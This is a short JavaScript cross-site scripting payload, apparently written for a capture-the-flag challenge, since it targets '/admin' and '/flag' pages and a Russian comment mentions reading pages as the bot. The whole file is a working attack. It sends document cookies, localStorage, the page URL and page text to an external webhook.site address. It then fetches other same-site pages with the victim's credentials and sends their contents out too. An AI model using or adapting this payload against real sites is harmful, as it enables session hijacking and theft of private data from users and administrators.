(() => {
  const W = "https://webhook.site/b305eb85-951a-4ea1-aaaf-63ba3b3b0eb4";
  const send = (k, v) => {
    new Image().src = W + "?" + k + "=" + encodeURIComponent(String(v)).slice(0, 1800);
  };

  send("ping", "1");
  send("cookie", document.cookie);
  send("url", location.href);
  send("ls", JSON.stringify(localStorage));
  send("text", document.body.innerText.slice(0, 1500));

  // Читаем другие страницы того же сайта от имени бота
  for (const p of ["/", "/admin", "/flag"]) {
    fetch(p, { credentials: "include" })
      .then(r => r.text())
      .then(t => send("p" + p.replace(/\W/g, "_"), t.slice(0, 1500)))
      .catch(() => {});
  }
})();